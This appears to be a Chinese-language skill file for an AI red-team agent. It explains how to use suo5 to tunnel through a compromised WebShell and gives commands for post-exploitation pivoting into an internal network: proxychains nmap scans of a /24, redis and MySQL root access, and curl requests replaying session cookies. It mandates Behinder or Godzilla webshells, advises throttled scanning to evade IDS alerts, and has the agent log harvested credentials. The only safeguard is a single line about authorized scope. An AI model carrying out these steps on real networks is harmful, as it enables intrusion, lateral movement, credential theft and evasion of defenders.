---
name: suo5-tunnel
description: 用 suo5 通过 WebShell/HTTP 建立 SOCKS5 隧道，把内网流量代理出来（内网突破核心工具）
whenToUse: 已拿到一台机器（WebShell/RCE）需要进入内网扫描与横向时
role: internal
enabled: true
---

# suo5 内网隧道

> **打进内网的标准通道只有这一条**：拿到 WebShell/RCE 后**必须**先用 suo5 建 socks5 隧道，
> 把隧道登记进库（`redteam_tunnel_add` kind=suo5）并用 `redteam_session_check` 验证真的通，
> 然后才谈内网测绘与横向。**没有隧道就不要手搓内网探测脚本**——手搓既慢又容易把入口打死。
> 隧道入口的 WebShell 必须是冰蝎马/哥斯拉马（见技能 `webshell-toolkit`），否则用户无法复用。

二进制：`$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）

## 建立隧道
```bash
SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64

# 1) 用 WebShell 作为隧道端点（HTTP 型）
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5

# 2) 需要认证时
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 --auth user:pass

# 3) 只走 HTTP 代理（部分工具只支持 http proxy）
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:8081 -m http
```
参数速查：`-t` 目标 shell URL、`-l` 本地监听、`-m socks5|http`、`--auth user:pass`、`-r` 重连间隔、`--debug` 看流量。

## 通过隧道做内网操作
```bash
# curl 走 socks5
curl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I

# nmap 必须用 -sT（全连接）+ proxychains，或直接 --proxies（新版）
proxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt

# 数据库 / 中间件
proxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info
proxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5

# 浏览器/接口测试走隧道
curl -s --socks5 127.0.0.1:1080 "http://10.0.0.8:8080/api/user/1" -H "Cookie: JSESSIONID=..."
```

## 内网扫描节奏（避免告警）
- 先 `/24` 存活探测（`nmap -sn` 经隧道或 ICMP），再对存活主机做常见端口。
- 速率降到 `-T2 --max-rate 50`，避免 IDS 触发。
- 新发现的资产全部 `redteam_asset_add`（会自动按 /24 建 C 段），并标 `provenance="active"`、`tool="suo5+nmap"`。

## 落库
- **建好立刻登记（强制）**：`redteam_tunnel_add`（`kind=suo5`、`listen=127.0.0.1:1080`、`entry=<WebShell URL>`、`reach=可达网段`、`command=完整启动命令`），`webshell_id` 指向对应的 WebShell 记录；随后 `redteam_session_check` 实测连通性，确认 status=active 再往下走。
- 隧道本身写 `redteam_chain_add`（stage=pivot，detail 写隧道端点与本地端口）。
- 每个内网资产、每次成功登录、每条凭据分别落库（asset/access/credential）。
- 隧道掉了用 `redteam_tunnel_update` 标 down；不要留一个"看起来在跑其实不通"的隧道给后续角色踩空。

## 注意事项
- 隧道端点文件用完后按需清理，恢复目标原状。
- 免费公网代理不适合承载隧道；suo5 走的是目标自身的 WebShell，不需要额外代理。
- 只在授权范围内使用。
